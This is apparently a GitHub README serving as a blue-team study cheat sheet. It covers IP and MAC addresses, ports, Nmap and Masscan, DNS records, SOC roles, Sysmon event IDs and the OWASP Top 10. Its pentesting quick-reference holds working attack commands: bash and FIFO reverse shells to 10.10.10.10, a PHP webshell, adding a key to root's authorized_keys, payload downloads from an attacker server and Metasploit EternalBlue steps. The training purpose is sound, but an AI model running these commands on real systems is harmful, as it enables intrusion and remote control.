# blue-team
# Blue-Team Tools & Networking Cheat Sheet

A comprehensive Markdown reference covering blue-team tools, networking basics, SOC operations, Linux commands, pentesting commands (for understanding attacker techniques), and OWASP Top 10 (2021). Use this for study, SOC playbooks, or to build internal documentation.

---

## Table of Contents

* IP address
* MAC address
* TCP vs UDP
* Common Ports
* hostname command, /proc/version, lscpu, ps aux
* Network Discovery Tools (Nuclei, Nmap, Masscan, ZMap)
* DNS Record Types
* Recon Tools (crt.sh, Sublist3r, WhatWeb)
* Vulnerability Scanners (Nessus, Nexpose)
* Security Operations Center (SOC)
* Sysmon (Windows) — Key Event IDs
* Useful CLI Tools: tmux, vim
* Pentesting / Recon Commands (service scanning, web enumeration, exploits)
* Shells & File Transfer Techniques
* Privilege Escalation Enumeration
* OWASP Top 10 — 2021 (A01 to A07)

---

# IP address

An IP address (Internet Protocol address) is a unique identifier assigned to each device connected to a network, allowing devices to communicate with each other. It can be **IPv4** (e.g., `192.168.1.10`) or **IPv6** (e.g., `2001:0db8:85a3::8a2e:0370:7334`).

| Type     | Example         | Scope / Use Case                      |
| -------- | --------------- | ------------------------------------- |
| Private  | `192.168.1.10`  | Local LAN (home, office)              |
| Public   | `103.25.231.88` | Internet-facing, ISP-assigned         |
| Static   | `203.0.113.25`  | Fixed server IP (websites, VPNs, DNS) |
| Dynamic  | `103.45.68.90`  | ISP-assigned, changes periodically    |
| Loopback | `127.0.0.1`     | Testing on your own device            |
| APIPA    | `169.254.45.10` | Self-assigned when DHCP fails         |

---

# MAC address

A MAC address (Media Access Control address) is a unique identifier assigned to a network interface card (NIC) for communication on a physical network segment. Unlike IP addresses, which can change depending on the network, a MAC address is hardware-based and usually permanent (burned into the device by the manufacturer).

**Key Points:**

* Format: 6 pairs of hexadecimal numbers separated by colons or hyphens
* Example: `00:1A:2B:3C:4D:5E` or `00-1A-2B-3C-4D-5E`
* Length: 48 bits (6 bytes)

---

# TCP vs UDP

TCP (Transmission Control Protocol) and UDP (User Datagram Protocol) are two core transport layer protocols in the TCP/IP model.

| Feature        | TCP                               | UDP                             |
| -------------- | --------------------------------- | ------------------------------- |
| Full Name      | Transmission Control Protocol     | User Datagram Protocol          |
| Type           | Connection-oriented               | Connectionless                  |
| Reliability    | Reliable (guaranteed delivery)    | Unreliable (no guarantee)       |
| Error Checking | Retransmits lost packets          | Checks errors but no retransmit |
| Order          | Preserves packet order            | Packets may arrive out of order |
| Speed          | Slower (handshakes & retransmits) | Faster (minimal overhead)       |
| Use Cases      | Web (HTTP/HTTPS), Email, FTP      | Streaming, DNS, VoIP            |
| Connection     | 3-way handshake                   | No handshake                    |
| Flow Control   | Supported                         | Not supported                   |
| Header Size    | 20 bytes minimum                  | 8 bytes minimum                 |

**Summary:** TCP is reliable and heavier; UDP is lightweight and faster for real-time traffic.

---

# Common Ports and Services

| Port(s) | Protocol | Purpose                               |
| ------- | -------- | ------------------------------------- |
| 20/21   | TCP      | FTP (data/commands)                   |
| 22      | TCP      | SSH (secure remote login)             |
| 23      | TCP      | Telnet (unencrypted login — insecure) |
| 25      | TCP      | SMTP (send email)                     |
| 80      | TCP      | HTTP (web)                            |
| 161     | TCP/UDP  | SNMP (device management)              |
| 389     | TCP/UDP  | LDAP (directory/authentication)       |
| 443     | TCP      | HTTPS (HTTP over TLS)                 |
| 445     | TCP      | SMB (Windows file/printer sharing)    |
| 3389    | TCP      | RDP (Remote Desktop Protocol)         |

**Tools:**

* **SSH**: secure, encrypted remote shell and file transfer.
* **Netcat (nc)**: raw TCP/UDP tool for sending/receiving data; useful for debugging and simple shells.

---

# Useful Linux Commands

### `hostname`

Used to display or set the system’s hostname (identifier on the network):

```bash
hostname
```

### `/proc/version`

`/proc/version` reports how the running kernel was built — including version, compiler, build host, and configuration flags:

```bash
cat /proc/version
```

### `lscpu`

Displays CPU architecture information (parses `/proc/cpuinfo` & sysfs) in a human-readable table:

```bash
lscpu
```

### `ps aux`

Shows processes running on the system (all users, user-oriented format, including background jobs):

```bash
ps aux
```

Example columns:

* `USER`, `PID`, `%CPU`, `%MEM`, `VSZ`, `RSS`, `TTY`, `STAT`, `START`, `TIME`, `COMMAND`

---

# Example Output of `ps aux`

```bash
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1 169276  1056 ?        Ss   10:30   0:02 /sbin/init
kali      1523  1.2  2.5 233456 20320 ?        Sl   10:31   0:05 /usr/bin/firefox
kali      1900  0.0  0.3  21344  3024 pts/0    R+   10:35   0:00 ps aux
```

# Network Discovery Tools

## Nuclei

Nuclei is a fast, template-based vulnerability scanner that uses YAML templates to detect vulnerabilities, misconfigurations, CVEs, and exposures across multiple protocols (HTTP, DNS, TCP, SSL, file, cloud).

Common detections: SQLi, XSS, open admin panels, weak TLS, information disclosure.

## Nmap

**Nmap (Network Mapper)** is a powerful tool for host discovery and network auditing.

Key features:

* Host discovery
* Port scanning
* Service/version detection (`-sV`)
* OS detection (`-O`)
* NSE (Nmap Scripting Engine) for advanced checks
* Timing templates (`-T0`..`-T5`)

> Note: by default Nmap scans the top 1000 ports unless `-p-` is used for all ports.

### NSE (Nmap Scripting Engine)

Use categories like `vuln`, `auth`, `http-*`, `smb-*` for deeper scanning and automation.

## Masscan

Ultra-fast Internet-scale port scanner for discovering open ports across very large ranges.

|           Feature | Nmap                | Masscan                                |
| ----------------: | ------------------- | -------------------------------------- |
|     Ports scanned | Top 1000 by default | You specify (can scan all 65535)       |
|             Speed | Slower, accurate    | Extremely fast                         |
| Service detection | Yes (`-sV`)         | No                                     |
|      OS detection | Yes (`-O`)          | No                                     |
|   False positives | Low                 | Possible at high rates                 |
|     IDS detection | Can trigger alerts  | Very likely to trigger if rate is high |

**Comparison note:** Use Masscan for broad discovery, then Nmap for accurate service/version detection on targets of interest.

---

# DNS Record Types

* **A record** — IPv4 address (e.g., `104.26.10.229`).
* **AAAA record** — IPv6 address (e.g., `2606:4700:20::681a:be5`).
* **CNAME record** — Canonical name pointing to another domain (e.g., `store.example.com` → `shops.examplehost.com`).
* **MX record** — Mail exchange server for a domain (with priority flag). Example: `alt1.aspmx.l.google.com`.
* **TXT record** — Arbitrary text, used for SPF, DKIM, ownership verification, etc.

---

# Recon & Enumeration Tools

* **crt.sh** — Public Certificate Transparency search; lists TLS/SSL certificates that mention a domain, useful for discovering subdomains and SANs.

* **Sublist3r** — Passive subdomain enumeration using public sources (search engines, DNS, cert logs).

* **WhatWeb** — Fingerprints web technologies (web server, CMS, frameworks, JS libs, analytics, plugins).

---

# Vulnerability Scanners Comparison

| Feature      | Nessus (Tenable)           | Nexpose (Rapid7)           |
| ------------ | -------------------------- | -------------------------- |
| Target       | Vulnerability scanning     | Vulnerability + risk mgmt  |
| Integration  | Scanning focused           | Integrates with Metasploit |
| Reporting    | Reports                    | Dashboards + reports       |
| Free version | Nessus Essentials (16 IPs) | Community (limited)        |

---

# Security Operations Center (SOC)

A SOC combines people, processes, and technology to monitor, detect, investigate, and respond to cybersecurity incidents.

## Core Responsibilities

* 24/7 monitoring (logs, endpoints, network, cloud)
* Detection (SIEM, EDR, IDS alerts)
* Triage & investigation
* Incident response (containment, eradication, recovery)
* Threat hunting
* Threat intelligence (IoCs, TTPs)
* Forensics & root-cause analysis
* Reporting & compliance
* Playbook development & tuning
* Security engineering (logging, tool tuning)

## SOC Models

* In-House / Internal SOC
* Managed SOC / MSSP
* Co‑Managed SOC
* Virtual SOC (vSOC)
* Command SOC (centralized coordination)

## SOC Roles & Tiers

| Tier / Role          | Responsibilities                        | Key Skills                            |
| -------------------- | --------------------------------------- | ------------------------------------- |
| Tier 1 Analyst       | Alert triage, validate alerts, escalate | Log basics, Linux/Windows, networking |
| Tier 2 Analyst       | Deep investigation, endpoint triage     | EDR tools, packet analysis, scripting |
| Tier 3 Analyst       | Threat hunting, malware analysis        | Reverse engineering, memory forensics |
| SOC Engineer         | Build/tune SIEM, automation             | SIEM internals, APIs, pipelines       |
| Threat Intel Analyst | Curate IoCs, map to ATT&CK              | Intel analysis, ATT&CK mapping        |
| SOC Manager          | Operations, KPIs, budgets               | Management, communication             |

---

# Sysmon (Windows) — Key Event IDs

**Sysmon** (Microsoft Sysinternals) logs detailed system events to the Windows Event Log used by security teams.

| Event ID | Description                                         |
| -------: | --------------------------------------------------- |
|        1 | Process creation (command line, hashes, parent PID) |
|        2 | File creation time changed (timestamp tampering)    |
|        3 | Network connection (source/destination IPs, ports)  |
|        4 | Sysmon service state changed (started/stopped)      |
|        5 | Process terminated                                  |
|        6 | Driver loaded (detect rootkits)                     |
|        7 | Image loaded (DLLs/executables loaded by processes) |
|        8 | CreateRemoteThread (code injection)                 |
|        9 | RawAccessRead (direct disk access)                  |
|       10 | Process access (attempts to access another process) |
|       11 | File created                                        |
|       12 | Registry object created or deleted                  |
|       13 | Registry value set                                  |
|       14 | Registry object renamed                             |
|       15 | File stream created (Alternate Data Streams)        |
|       16 | Sysmon config change                                |
|       17 | Pipe created (named pipe IPC)                       |
|       18 | Pipe connected                                      |
|       19 | WMI event filter registered                         |
|       20 | WMI event consumer registered                       |
|       21 | WMI event consumer to filter binding                |
|       22 | DNS query (process-level domain lookups)            |
|       23 | File Delete archived                                |
|       24 | Clipboard changed (if enabled)                      |
|       25 | Process Tampering (hollowing, etc.)                 |
|       26 | File Delete logged                                  |
|       27 | FileBlock Executable (blocked by config)            |
|       28 | FileBlock Shredding                                 |
|       29 | FileBlock Unauthorized                              |

---

# CLI Tools: tmux & vim Cheatsheet

## tmux

| Command          | Description              |
| ---------------- | ------------------------ |
| `tmux`           | Start tmux               |
| `Ctrl+b`         | Prefix key               |
| `prefix c`       | New window               |
| `prefix 1`       | Switch to window 1       |
| `prefix Shift+%` | Split pane vertically    |
| `prefix Shift+"` | Split pane horizontally  |
| `prefix →`       | Switch to the right pane |

## vim

| Command    | Description           |
| ---------- | --------------------- |
| `vim file` | Open file             |
| `Esc i`    | Enter insert mode     |
| `Esc`      | Return to normal mode |
| `x`        | Delete character      |
| `dw`       | Delete word           |
| `dd`       | Delete full line      |
| `yw`       | Yank (copy) word      |
| `yy`       | Yank (copy) full line |
| `p`        | Paste                 |
| `:1`       | Go to line 1          |
| `:w`       | Save file             |
| `:q`       | Quit                  |
| `:q!`      | Quit without saving   |
| `:wq`      | Save and quit         |

---

# Pentesting / Recon Commands (quick reference)

## Service Scanning

| Command                                                    | Description                       |
| ---------------------------------------------------------- | --------------------------------- |
| `nmap 10.129.42.253`                                       | Run nmap on an IP                 |
| `nmap -sV -sC -p- 10.129.42.253`                           | Full port & script scan           |
| `locate scripts/citrix`                                    | List nmap scripts available       |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40`     | Run specific NSE script           |
| `netcat 10.10.10.10 22`                                    | Grab banner                       |
| `smbclient -N -L \\\\10.129.42.253`                        | List SMB shares                   |
| `smbclient \\\\10.129.42.253\\users`                       | Connect to SMB share              |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` | SNMP query                        |
| `onesixtyone -c dict.txt 10.129.42.254`                    | Brute force SNMP community string |

## Web Enumeration

| Command                                                                         | Description                          |
| ------------------------------------------------------------------------------- | ------------------------------------ |
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt`  | Directory brute-force                |
| `gobuster dns -d example.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Subdomain brute-force                |
| `curl -IL https://www.example.com`                                              | Grab site headers/banner             |
| `whatweb 10.10.10.121`                                                          | Fingerprint webserver/technologies   |
| `curl http://10.10.10.121/robots.txt`                                           | Check robots.txt for sensitive paths |
| `Ctrl+U` (in Firefox)                                                           | View page source (quick)             |

## Public Exploits / Metasploit

| Command                                   | Description                       |
| ----------------------------------------- | --------------------------------- |
| `searchsploit openssh 7.2`                | Search exploit-db for Openssh 7.2 |
| `msfconsole`                              | Start Metasploit Framework        |
| `search exploit eternalblue`              | Search MSF for EternalBlue        |
| `use exploit/windows/smb/ms17_010_psexec` | Choose MSF module                 |
| `show options`                            | Show module options               |
| `set RHOSTS 10.10.10.40`                  | Set module target                 |
| `check`                                   | Test if target vulnerable         |
| `exploit`                                 | Run exploit                       |

---

# Shells & TTY Upgrades

| Command                                                           | Description                            |                              |                        |
| ----------------------------------------------------------------- | -------------------------------------- | ---------------------------- | ---------------------- |
| `nc -lvnp 1234`                                                   | Start a netcat listener                |                              |                        |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`             | Reverse shell (bash)                   |                              |                        |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f                               | /bin/sh -i 2>&1                        | nc 10.10.10.10 1234 >/tmp/f` | Reverse shell via FIFO |
| `python -c 'import pty; pty.spawn("/bin/bash")'`                  | Upgrade shell to fully interactive TTY |                              |                        |
| `Ctrl+Z` then `stty raw -echo` then `fg` then Enter twice         | Alternative TTY upgrade                |                              |                        |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | Create a PHP webshell                  |                              |                        |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id`                     | Execute command on webshell            |                              |                        |

---

# Privilege Escalation Enumeration

| Command                                                           | Description                                 |
| ----------------------------------------------------------------- | ------------------------------------------- |
| `./linpeas.sh`                                                    | Run linPEAS enumeration script              |
| `sudo -l`                                                         | List allowed sudo commands for current user |
| `sudo -u user /bin/echo Hello`                                    | Run command as another user via sudo        |
| `sudo su -`                                                       | Switch to root if allowed                   |
| `ssh-keygen -f key`                                               | Create SSH key pair                         |
| `echo "ssh-rsa AAAAB... user@host" >> /root/.ssh/authorized_keys` | Add public key to root's authorized_keys    |
| `ssh root@10.10.10.10 -i key`                                     | SSH using private key                       |

---

# Transferring Files

| Command                                                | Description                                           |                              |
| ------------------------------------------------------ | ----------------------------------------------------- | ---------------------------- |
| `python3 -m http.server 8000`                          | Start a simple HTTP server in CWD                     |                              |
| `wget http://10.10.14.1:8000/linpeas.sh`               | Download file from an attacker-controlled HTTP server |                              |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Download file with curl                               |                              |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh`       | Copy file via SCP (requires SSH)                      |                              |
| `base64 file -w 0`                                     | Convert file to base64 without linewrap               |                              |
| `echo f0VMR...                                         | base64 -d > shell`                                    | Decode base64 back to binary |
| `md5sum shell`                                         | Check file MD5 checksum                               |                              |

---

# OWASP Top 10 (2021) — A01 to A07

The OWASP Top 10 highlights the most critical web application security risks (2021 edition). Below are summaries for A01 to A07.

## A01:2021 – Broken Access Control

**Definition:** Users can access data or perform actions they shouldn’t be allowed to.
**Examples:** IDOR (insecure direct object references), missing server-side checks.
**Mitigation:** Enforce server-side authorization checks, deny-by-default.

## A02:2021 – Cryptographic Failures

**Definition:** Sensitive data is not properly protected at rest or in transit.
**Examples:** Plaintext passwords, outdated TLS.
**Mitigation:** Use strong encryption, secure key management, enforce HTTPS.

## A03:2021 – Injection

**Definition:** Unsanitized user input is executed by the server (SQL, OS, LDAP, etc.).
**Examples:** `SELECT * FROM users WHERE username='$input'` --> SQLi.
**Mitigation:** Parameterized queries, input validation, ORMs.

## A04:2021 – Insecure Design

**Definition:** Architectural & design flaws that lead to security problems even with secure code.
**Examples:** Missing MFA for critical actions, weak session design.
**Mitigation:** Threat modeling, secure design reviews.

## A05:2021 – Security Misconfiguration

**Definition:** Incorrect or default configurations that expose attack surface.
**Examples:** Default admin accounts, verbose errors.
**Mitigation:** Harden images, remove defaults, automated config checks.

## A06:2021 – Vulnerable & Outdated Components

**Definition:** Using libraries/frameworks with known vulnerabilities.
**Examples:** Outdated CMS plugins, unpatched libraries.
**Mitigation:** Dependency scanning, timely patching.

## A07:2021 – Identification & Authentication Failures

**Definition:** Weak or broken authentication mechanisms.
**Examples:** Missing MFA, weak password policies.
**Mitigation:** Enforce MFA, strong password and session policies, rate limiting.

---

*End of cheat sheet.*

> Tip: Use this as a living document — keep an updated section for local SOC detection rules, custom playbooks, and a curated list of relevant tools and their command templates.
